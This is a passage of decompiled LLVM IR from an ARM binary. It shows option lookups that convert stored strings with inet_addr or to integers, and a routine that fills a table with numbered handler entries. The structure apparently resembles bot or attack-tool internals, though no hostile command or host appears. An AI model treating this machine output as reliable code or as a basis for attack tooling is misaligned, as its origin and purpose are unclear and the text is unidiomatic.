dec_label_pc_9204:                                ; preds = %dec_label_pc_91d0, %dec_label_pc_9134, %dec_label_pc_9120
  %stack_var_-48.1 = phi i32 [ %v3_9120, %dec_label_pc_9120 ], [ %v0_9140, %dec_label_pc_9134 ], [ %v0_9140, %dec_label_pc_91d0 ]
  %stack_var_-52.2 = phi i32 [ %v3_9120, %dec_label_pc_9120 ], [ %v4_913c, %dec_label_pc_9134 ], [ %v4_913c, %dec_label_pc_91d0 ]
  %v0_9204 = call i32* @__errno_location()
  %v0_9208 = load i32, i32* @sl, align 4
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_9214 = mul i32 %v0_9208, 16777216
  %v1_9208 = mul i32 %v0_9208, 256
  %v4_9218 = and i32 %v1_9208, 16711680
  %v5_9218 = or i32 %v4_9218, %v3_9214
  store i32 %v5_9218, i32* %r1.global-to-local, align 4
  %v1_9210 = udiv i32 %v0_9208, 256
  %v3_921c = and i32 %v1_9210, 65280
  store i32 %v3_921c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v0_9204, align 4
  %v1_9228 = load i32, i32* @sl, align 4
  %v4_9228 = udiv i32 %v1_9228, 16777216
  %v5_9228 = or i32 %v4_9228, %v3_921c
  %v0_922c = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_9234 = load i32, i32* %r1.global-to-local, align 4
  %v2_9234 = or i32 %v5_9228, %v1_9234
  store i32 %v2_9234, i32* %r0.global-to-local, align 4
  store i32 %v4_907c, i32* %r1.global-to-local, align 4
  %v0_9240 = load i32, i32* @r7, align 4
  store i32 %v0_9240, i32* %r2.global-to-local, align 4
  %v6_9248 = trunc i32 %v0_922c to i8
  %v7_9248 = call i32 @function_8f5c(i32 %v2_9234, i32 %v4_907c, i32 %v0_9240, i32 %v4_90b0, i8 %v6_9248, i32 %stack_var_-52.2)
  store i32 %v7_9248, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_924c

dec_label_pc_924c:                                ; preds = %dec_label_pc_91c4, %dec_label_pc_91a4, %dec_label_pc_919c, %dec_label_pc_916c, %dec_label_pc_9158, %dec_label_pc_9150, %dec_label_pc_9114, %dec_label_pc_9204
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_9114 ], [ %stack_var_-52.2, %dec_label_pc_9204 ], [ %v4_913c, %dec_label_pc_9150 ], [ %v4_913c, %dec_label_pc_9158 ], [ %v4_913c, %dec_label_pc_916c ], [ %v4_913c, %dec_label_pc_919c ], [ %v4_913c, %dec_label_pc_91a4 ], [ %v4_913c, %dec_label_pc_91c4 ]
  store i32 %v4_90b0, i32* %r1.global-to-local, align 4
  %v2_9250 = icmp eq i32* %v2_90b0, null
  store i1 %v2_9250, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9250, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_924c
  store i32 %v4_90b0, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_924c, %bb
  store i32 37468, i32* %lr.global-to-local, align 4
  %v1_9258 = xor i1 %v2_9250, true
  call void @__pseudo_cond_branch(i1 %v1_9258, i32 ptrtoint (i32* @global_var_8db8.79 to i32))
  %v2_9260 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_9260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9260, label %.dec_label_pc_9070_crit_edge, label %dec_label_pc_9268

.dec_label_pc_9070_crit_edge:                     ; preds = %bb31
  %v29_9074.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9070

dec_label_pc_9268:                                ; preds = %bb31
  %v0_9268 = load i32, i32* @sb, align 4
  %v2_9268 = icmp eq i32 %v0_9268, 0
  store i1 %v2_9268, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_9268, 1
  br i1 %tmp32, label %dec_label_pc_9290, label %dec_label_pc_9270

dec_label_pc_9270:                                ; preds = %dec_label_pc_9268
  br label %dec_label_pc_9274

dec_label_pc_9274:                                ; preds = %dec_label_pc_9274, %dec_label_pc_9270
  %v0_9280 = phi i32 [ %v1_9280, %dec_label_pc_9274 ], [ 0, %dec_label_pc_9270 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_9278 = mul i32 %v0_9280, 8
  %v5_9278 = add i32 %v4_9278, %stack_var_-52.3
  %v6_9278 = inttoptr i32 %v5_9278 to i32*
  %v7_9278 = load i32, i32* %v6_9278, align 4
  store i32 %v7_9278, i32* %r0.global-to-local, align 4
  %v2_927c = icmp eq i32 %v7_9278, 0
  store i1 %v2_927c, i1* %cpsr_z.global-to-local, align 1
  %v1_9280 = add i32 %v0_9280, 1
  store i32 37512, i32* %lr.global-to-local, align 4
  %v1_9284 = xor i1 %v2_927c, true
  call void @__pseudo_cond_branch(i1 %v1_9284, i32 ptrtoint (i32* @global_var_8db8.79 to i32))
  %v0_9288 = load i32, i32* @sb, align 4
  %v9_9288 = icmp eq i32 %v0_9288, %v1_9280
  store i1 %v9_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9288, label %dec_label_pc_9290, label %dec_label_pc_9274

dec_label_pc_9290:                                ; preds = %dec_label_pc_9274, %dec_label_pc_9268
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_904c, i32* @r6, align 4
  store i32 %v12_904c, i32* @r7, align 4
  store i32 %v18_904c, i32* @sb, align 4
  store i32 %v21_904c, i32* @sl, align 4
  store i32 %v27_904c, i32* %lr.global-to-local, align 4
  %v1_929c = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_929c)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i1 %v2_9250, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_9208, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_91f4, { 1, 0 }
  uselistorder i32 %v3_91d8, { 0, 2, 1 }
  uselistorder i32 %v2_91b0, { 2, 1, 0 }
  uselistorder i32 %v2_91c8, { 1, 0 }
  uselistorder i32 %v4_91c4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_91b8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_91b4, { 1, 0 }
  uselistorder i32 %v0_9150, { 0, 2, 1 }
  uselistorder i32 %v0_9140, { 0, 2, 1, 3 }
  uselistorder i32 %v4_913c, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_9120, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_90fc, { 1, 0 }
  uselistorder i32 %v0_90e0, { 0, 2, 1 }
  uselistorder i32 %v0_90bc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_90b0, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v2_909c, { 2, 1, 0 }
  uselistorder i32 %v4_9088, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_907c, { 1, 0, 2 }
  uselistorder i32 %v0_905c, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 21, 2, 3, 22, 4, 23, 5, 8, 12, 9, 6, 7, 10, 11, 18, 13, 15, 14, 16, 17, 20, 19, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 4, 5, 0, 2, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_924c, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_9070, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_92a0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_92a0:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_92a0 = urem i32 %arg1, 256
  %v2_92a4 = icmp eq i32 %v1_92a0, 0
  br i1 %v2_92a4, label %dec_label_pc_92f0, label %dec_label_pc_92b4

dec_label_pc_92b4:                                ; preds = %dec_label_pc_92a0
  %v0_92b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_92b4 = add i32 %v0_92b4, 4
  %v2_92b4 = inttoptr i32 %v1_92b4 to i8*
  %v3_92b4 = load i8, i8* %v2_92b4, align 1
  %v4_92b4 = zext i8 %v3_92b4 to i32
  %v1_92b8 = urem i32 %arg3, 256
  %v9_92bc = icmp eq i32 %v4_92b4, %v1_92b8
  br i1 %v9_92bc, label %dec_label_pc_92f8, label %dec_label_pc_92e0.preheader

dec_label_pc_92e0.preheader:                      ; preds = %dec_label_pc_92b4
  br label %dec_label_pc_92e0

dec_label_pc_92d0:                                ; preds = %dec_label_pc_92e0
  %v1_92d0 = add i32 %v0_92d8.in, 12
  %v2_92d0 = inttoptr i32 %v1_92d0 to i8*
  %v3_92d0 = load i8, i8* %v2_92d0, align 1
  %v4_92d0 = zext i8 %v3_92d0 to i32
  %v9_92d4 = icmp eq i32 %v1_92b8, %v4_92d0
  br i1 %v9_92d4, label %dec_label_pc_92f8, label %dec_label_pc_92e0

dec_label_pc_92e0:                                ; preds = %dec_label_pc_92e0.preheader, %dec_label_pc_92d0
  %v0_92d8.in = phi i32 [ %v0_92b4, %dec_label_pc_92e0.preheader ], [ %v0_92d8, %dec_label_pc_92d0 ]
  %v0_92e0 = phi i32 [ 0, %dec_label_pc_92e0.preheader ], [ %v1_92e0, %dec_label_pc_92d0 ]
  %v0_92d8 = add i32 %v0_92d8.in, 8
  %v1_92e0 = add i32 %v0_92e0, 1
  %v9_92e4 = icmp eq i32 %v1_92a0, %v1_92e0
  store i32 %v0_92d8, i32* %r1.global-to-local, align 4
  br i1 %v9_92e4, label %dec_label_pc_92f0, label %dec_label_pc_92d0

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92e0, %dec_label_pc_92f8, %dec_label_pc_92a0
  ret i32 %arg4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_92d0, %dec_label_pc_92b4
  %v0_92f8 = phi i32 [ %v0_92b4, %dec_label_pc_92b4 ], [ %v0_92d8, %dec_label_pc_92d0 ]
  %v1_92f8 = inttoptr i32 %v0_92f8 to i32*
  %v2_92f8 = load i32, i32* %v1_92f8, align 4
  %v3_92fc = icmp eq i32 %v2_92f8, 0
  br i1 %v3_92fc, label %dec_label_pc_92f0, label %dec_label_pc_9304

dec_label_pc_9304:                                ; preds = %dec_label_pc_92f8
  %v3_92f8 = inttoptr i32 %v2_92f8 to i8*
  %v3_9308 = call i32 @inet_addr(i8* %v3_92f8)
  ret i32 %v3_9308

; uselistorder directives
  uselistorder i32 %v2_92f8, { 1, 0 }
  uselistorder i32 %v1_92e0, { 1, 0 }
  uselistorder i32 %v0_92d8, { 1, 0, 2 }
  uselistorder i32 %v0_92d8.in, { 1, 0 }
  uselistorder i32 %v1_92b8, { 1, 0 }
  uselistorder i32 %v0_92b4, { 1, 0, 2 }
  uselistorder i32 %v1_92a0, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_92f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_92e0, { 1, 0 }
}

define i32 @function_930c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_930c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_930c = urem i32 %arg1, 256
  %v2_9310 = icmp eq i32 %v1_930c, 0
  %v3_9314 = load i32, i32* @r4, align 4
  br i1 %v2_9310, label %dec_label_pc_935c, label %dec_label_pc_9320

dec_label_pc_9320:                                ; preds = %dec_label_pc_930c
  %v0_9320 = load i32, i32* %r1.global-to-local, align 4
  %v1_9320 = add i32 %v0_9320, 4
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  %v1_9324 = urem i32 %arg3, 256
  %v9_9328 = icmp eq i32 %v4_9320, %v1_9324
  br i1 %v9_9328, label %dec_label_pc_9364, label %dec_label_pc_934c.preheader

dec_label_pc_934c.preheader:                      ; preds = %dec_label_pc_9320
  br label %dec_label_pc_934c

dec_label_pc_933c:                                ; preds = %dec_label_pc_934c
  %v1_933c = add i32 %v0_9344.in, 12
  %v2_933c = inttoptr i32 %v1_933c to i8*
  %v3_933c = load i8, i8* %v2_933c, align 1
  %v4_933c = zext i8 %v3_933c to i32
  %v9_9340 = icmp eq i32 %v1_9324, %v4_933c
  br i1 %v9_9340, label %dec_label_pc_9364, label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %dec_label_pc_934c.preheader, %dec_label_pc_933c
  %v0_9344.in = phi i32 [ %v0_9320, %dec_label_pc_934c.preheader ], [ %v0_9344, %dec_label_pc_933c ]
  %v0_934c = phi i32 [ 0, %dec_label_pc_934c.preheader ], [ %v1_934c, %dec_label_pc_933c ]
  %v0_9344 = add i32 %v0_9344.in, 8
  %v1_934c = add i32 %v0_934c, 1
  store i32 %v1_934c, i32* @lr, align 4
  %v9_9350 = icmp eq i32 %v1_930c, %v1_934c
  store i32 %v0_9344, i32* %r1.global-to-local, align 4
  br i1 %v9_9350, label %dec_label_pc_935c, label %dec_label_pc_933c

dec_label_pc_935c:                                ; preds = %dec_label_pc_934c, %dec_label_pc_9364, %dec_label_pc_930c
  store i32 %v3_9314, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_9364:                                ; preds = %dec_label_pc_933c, %dec_label_pc_9320
  %v0_9364 = phi i32 [ %v0_9320, %dec_label_pc_9320 ], [ %v0_9344, %dec_label_pc_933c ]
  %v1_9364 = inttoptr i32 %v0_9364 to i32*
  %v2_9364 = load i32, i32* %v1_9364, align 4
  %v2_9368 = icmp eq i32 %v2_9364, 0
  br i1 %v2_9368, label %dec_label_pc_935c, label %dec_label_pc_9370

dec_label_pc_9370:                                ; preds = %dec_label_pc_9364
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_9314, i32* @r4, align 4
  %v2_9378 = inttoptr i32 %v2_9364 to i8*
  %v3_9378 = call i32 @function_11b08(i8* %v2_9378, i32 10)
  ret i32 %v3_9378

; uselistorder directives
  uselistorder i32 %v1_934c, { 1, 2, 0 }
  uselistorder i32 %v0_9344, { 1, 0, 2 }
  uselistorder i32 %v0_9344.in, { 1, 0 }
  uselistorder i32 %v1_9324, { 1, 0 }
  uselistorder i32 %v0_9320, { 1, 0, 2 }
  uselistorder i32 %v3_9314, { 1, 0 }
  uselistorder i32 %v1_930c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_935c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_934c, { 1, 0 }
}

define i32 @function_937c(i32 %arg1) local_unnamed_addr {
dec_label_pc_937c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  store i32 %v3_937c, i32* %stack_var_-24, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_9388 = call i32* @calloc(i32 1, i32 8)
  %v3_9388 = ptrtoint i32* %v2_9388 to i32
  store i32 ptrtoint (i8** @global_var_1a6b8.75 to i32), i32* %r4.global-to-local, align 4
  %v2_9390 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9390 = zext i8 %v2_9390 to i32
  store i32 ptrtoint (i32* @global_var_1a6bc.77 to i32), i32* %r6.global-to-local, align 4
  store i32 52004, i32* %r2.global-to-local, align 4
  store i32 %v3_9388, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_93a4 = mul nuw nsw i32 %v3_9390, 4
  store i32 %v3_93a4, i32* %r1.global-to-local, align 4
  %v2_93a8 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 52004, i32* %v2_9388, align 4
  %v0_93b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_93b0 = trunc i32 %v0_93b0 to i8
  %v2_93b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_93b0 = add i32 %v2_93b0, 4
  %v4_93b0 = inttoptr i32 %v3_93b0 to i8*
  store i8 %v1_93b0, i8* %v4_93b0, align 1
  %v0_93b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_93b4 = add i32 %v0_93b4, 4
  store i32 %v1_93b4, i32* %r1.global-to-local, align 4
  %v4_93b8 = inttoptr i32 %v2_93a8 to i32*
  %v5_93b8 = call i32* @realloc(i32* %v4_93b8, i32 %v1_93b4)
  %v7_93b8 = ptrtoint i32* %v5_93b8 to i32
  %v2_93bc = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_93bc = zext i8 %v2_93bc to i32
  store i32 %v3_93bc, i32* %r3.global-to-local, align 4
  store i32 %v7_93b8, i32* %ip.global-to-local, align 4
  %v0_93c4 = load i32, i32* %r5.global-to-local, align 4
  %v5_93c4 = mul nuw nsw i32 %v3_93bc, 4
  %v6_93c4 = add i32 %v5_93c4, %v7_93b8
  %v7_93c4 = inttoptr i32 %v6_93c4 to i32*
  store i32 %v0_93c4, i32* %v7_93c4, align 4
  store i32 ptrtoint (i8* @global_var_1a6b9.83 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_93d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_93d4 = inttoptr i32 %v2_93d4 to i8*
  store i8 ptrtoint (i8* @global_var_1a6b9.83 to i8), i8* %v3_93d4, align 1
  %v0_93d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_93d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_93d8 = inttoptr i32 %v1_93d8 to i32*
  store i32 %v0_93d8, i32* %v2_93d8, align 4
  %v2_93dc = call i32* @calloc(i32 1, i32 8)
  %v3_93dc = ptrtoint i32* %v2_93dc to i32
  %v2_93e0 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_93e0 = zext i8 %v2_93e0 to i32
  store i32 ptrtoint (i32* @global_var_d1b0.85 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  store i32 %v3_93dc, i32* %r5.global-to-local, align 4
  %v3_93f0 = mul nuw nsw i32 %v3_93e0, 4
  store i32 %v3_93f0, i32* %r1.global-to-local, align 4
  %v2_93f4 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_d1b0.85 to i32), i32* %v2_93dc, align 4
  %v2_93fc = load i32, i32* %r5.global-to-local, align 4
  %v3_93fc = add i32 %v2_93fc, 4
  %v4_93fc = inttoptr i32 %v3_93fc to i8*
  store i8 1, i8* %v4_93fc, align 1
  %v0_9400 = load i32, i32* %r1.global-to-local, align 4
  %v1_9400 = add i32 %v0_9400, 4
  store i32 %v1_9400, i32* %r1.global-to-local, align 4
  %v3_9404 = inttoptr i32 %v2_93f4 to i32*
  %v4_9404 = call i32* @realloc(i32* %v3_9404, i32 %v1_9400)
  %v6_9404 = ptrtoint i32* %v4_9404 to i32
  %v2_9408 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9408 = zext i8 %v2_9408 to i32
  store i32 %v3_9408, i32* %r3.global-to-local, align 4
  store i32 %v6_9404, i32* %ip.global-to-local, align 4
  %v0_9410 = load i32, i32* %r5.global-to-local, align 4
  %v5_9410 = mul nuw nsw i32 %v3_9408, 4
  %v6_9410 = add i32 %v5_9410, %v6_9404
  %v7_9410 = inttoptr i32 %v6_9410 to i32*
  store i32 %v0_9410, i32* %v7_9410, align 4
  %v0_9414 = load i32, i32* %r3.global-to-local, align 4
  %v1_9414 = load i32, i32* %r8.global-to-local, align 4
  %v2_9414 = add i32 %v1_9414, %v0_9414
  store i32 %v2_9414, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_9420 = load i32, i32* %ip.global-to-local, align 4
  %v1_9420 = load i32, i32* %r6.global-to-local, align 4
  %v2_9420 = inttoptr i32 %v1_9420 to i32*
  store i32 %v0_9420, i32* %v2_9420, align 4
  %v0_9424 = load i32, i32* %r2.global-to-local, align 4
  %v1_9424 = trunc i32 %v0_9424 to i8
  %v2_9424 = load i32, i32* %r4.global-to-local, align 4
  %v3_9424 = inttoptr i32 %v2_9424 to i8*
  store i8 %v1_9424, i8* %v3_9424, align 1
  %v2_9428 = call i32* @calloc(i32 %v1_9414, i32 8)
  %v4_9428 = ptrtoint i32* %v2_9428 to i32
  %v2_942c = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_942c = zext i8 %v2_942c to i32
  store i32 ptrtoint (i32* @global_var_d674.87 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_9428, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_943c = mul nuw nsw i32 %v3_942c, 4
  store i32 %v3_943c, i32* %r1.global-to-local, align 4
  %v2_9440 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_d674.87 to i32), i32* %v2_9428, align 4
  %v0_9448 = load i32, i32* %r3.global-to-local, align 4
  %v1_9448 = trunc i32 %v0_9448 to i8
  %v2_9448 = load i32, i32* %r5.global-to-local, align 4
  %v3_9448 = add i32 %v2_9448, 4
  %v4_9448 = inttoptr i32 %v3_9448 to i8*
  store i8 %v1_9448, i8* %v4_9448, align 1
  %v0_944c = load i32, i32* %r1.global-to-local, align 4
  %v1_944c = add i32 %v0_944c, 4
  store i32 %v1_944c, i32* %r1.global-to-local, align 4
  %v4_9450 = inttoptr i32 %v2_9440 to i32*
  %v5_9450 = call i32* @realloc(i32* %v4_9450, i32 %v1_944c)
  %v7_9450 = ptrtoint i32* %v5_9450 to i32
  %v2_9454 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9454 = zext i8 %v2_9454 to i32
  store i32 %v3_9454, i32* %r3.global-to-local, align 4
  store i32 %v7_9450, i32* %ip.global-to-local, align 4
  %v1_945c = load i32, i32* %r8.global-to-local, align 4
  %v2_945c = add i32 %v1_945c, %v3_9454
  store i32 %v2_945c, i32* %r2.global-to-local, align 4
  %v0_9460 = load i32, i32* %r5.global-to-local, align 4
  %v5_9460 = mul nuw nsw i32 %v3_9454, 4
  %v6_9460 = add i32 %v5_9460, %v7_9450
  %v7_9460 = inttoptr i32 %v6_9460 to i32*
  store i32 %v0_9460, i32* %v7_9460, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_9468 = load i32, i32* %r8.global-to-local, align 4
  %v0_946c = load i32, i32* %r2.global-to-local, align 4
  %v1_946c = trunc i32 %v0_946c to i8
  %v2_946c = load i32, i32* %r4.global-to-local, align 4
  %v3_946c = inttoptr i32 %v2_946c to i8*
  store i8 %v1_946c, i8* %v3_946c, align 1
  %v0_9470 = load i32, i32* %ip.global-to-local, align 4
  %v1_9470 = load i32, i32* %r6.global-to-local, align 4
  %v2_9470 = inttoptr i32 %v1_9470 to i32*
  store i32 %v0_9470, i32* %v2_9470, align 4
  %v2_9474 = call i32* @calloc(i32 %v0_9468, i32 8)
  %v3_9474 = ptrtoint i32* %v2_9474 to i32
  %v2_9478 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_9478 = zext i8 %v2_9478 to i32
  store i32 ptrtoint (i32* @global_var_c83c.89 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* %r7.global-to-local, align 4
  store i32 %v3_9474, i32* %r5.global-to-local, align 4
  %v3_9488 = mul nuw nsw i32 %v3_9478, 4
  store i32 %v3_9488, i32* %r1.global-to-local, align 4
  %v2_948c = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_c83c.89 to i32), i32* %v2_9474, align 4
  %v2_9494 = load i32, i32* %r5.global-to-local, align 4
  %v3_9494 = add i32 %v2_9494, 4
  %v4_9494 = inttoptr i32 %v3_9494 to i8*
  store i8 8, i8* %v4_9494, align 1
  %v0_9498 = load i32, i32* %r1.global-to-local, align 4
  %v1_9498 = add i32 %v0_9498, 4
  store i32 %v1_9498, i32* %r1.global-to-local, align 4
  %v3_949c = inttoptr i32 %v2_948c to i32*
  %v4_949c = call i32* @realloc(i32* %v3_949c, i32 %v1_9498)
  %v6_949c = ptrtoint i32* %v4_949c to i32
  %v2_94a0 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_94a0 = zext i8 %v2_94a0 to i32
  store i32 %v3_94a0, i32* %r3.global-to-local, align 4
  store i32 %v6_949c, i32* %ip.global-to-local, align 4
  %v0_94a8 = load i32, i32* %r5.global-to-local, align 4
  %v5_94a8 = mul nuw nsw i32 %v3_94a0, 4
  %v6_94a8 = add i32 %v5_94a8, %v6_949c
  %v7_94a8 = inttoptr i32 %v6_94a8 to i32*
  store i32 %v0_94a8, i32* %v7_94a8, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = load i32, i32* %r8.global-to-local, align 4
  %v2_94ac = add i32 %v1_94ac, %v0_94ac
  store i32 %v2_94ac, i32* %r2.global-to-local, align 4
  %v0_94b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_94b0, i32* %r1.global-to-local, align 4
  %v0_94b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_94b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_94b8 = inttoptr i32 %v1_94b8 to i32*
  store i32 %v0_94b8, i32* %v2_94b8, align 4
  %v0_94bc = load i32, i32* %r2.global-to-local, align 4
  %v1_94bc = trunc i32 %v0_94bc to i8
  %v2_94bc = load i32, i32* %r4.global-to-local, align 4
  %v3_94bc = inttoptr i32 %v2_94bc to i8*
  store i8 %v1_94bc, i8* %v3_94bc, align 1
  %v2_94c0 = call i32* @calloc(i32 %v1_94ac, i32 %v0_94b0)
  %v4_94c0 = ptrtoint i32* %v2_94c0 to i32
  %v2_94c4 = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_94c4 = zext i8 %v2_94c4 to i32
  store i32 ptrtoint (i32* @global_var_c0f0.91 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_94c0, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_94d4 = mul nuw nsw i32 %v3_94c4, 4
  store i32 %v3_94d4, i32* %r1.global-to-local, align 4
  %v2_94d8 = load i32, i32* @global_var_1a6bc.77, align 4
  store i32 ptrtoint (i32* @global_var_c0f0.91 to i32), i32* %v2_94c0, align 4
  %v0_94e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_94e0 = trunc i32 %v0_94e0 to i8
  %v2_94e0 = load i32, i32* %r5.global-to-local, align 4
  %v3_94e0 = add i32 %v2_94e0, 4
  %v4_94e0 = inttoptr i32 %v3_94e0 to i8*
  store i8 %v1_94e0, i8* %v4_94e0, align 1
  %v0_94e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_94e4 = add i32 %v0_94e4, 4
  store i32 %v1_94e4, i32* %r1.global-to-local, align 4
  %v4_94e8 = inttoptr i32 %v2_94d8 to i32*
  %v5_94e8 = call i32* @realloc(i32* %v4_94e8, i32 %v1_94e4)
  %v7_94e8 = ptrtoint i32* %v5_94e8 to i32
  %v2_94ec = load i8, i8* bitcast (i8** @global_var_1a6b8.75 to i8*), align 4
  %v3_94ec = zext i8 %v2_94ec to i32
  store i32 %v3_94ec, i32* %r3.global-to-local, align 4
  store i32 %v7_94e8, i32* %ip.global-to-local, align 4
  %v0_94f4 = load i32, i32* %r5.global-to-local, align 4
  %v5_94f4 = mul nuw nsw i32 %v3_94ec, 4
  %v6_94f4 = add i32 %v5_94f4, %v7_94e8
  %v7_94f4 = inttoptr i32 %v6_94f4 to i32*
  store i32 %v0_94f4, i32* %v7_94f4, align 4
  %v0_94f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_94f8 = load i32, i32* %r8.global-to-local, align 4
  %v2_94f8 = add i32 %v1_94f8, %v0_94f8
  store i32 %v2_94f8, i32* %r2.global-to-local, align 4
  %v0_94fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_94fc, i32* %r1.global-to-local, align 4
  %v0_9504 = load i32, i32* %ip.global-to-local, align 4
  %v1_9504 = load i32, i32* %r6.global-to-local, align 4
  %v2_9504 = inttoptr i32 %v1_9504 to i32*
  store i32 %v0_9504, i32* %v2_9504, align 4
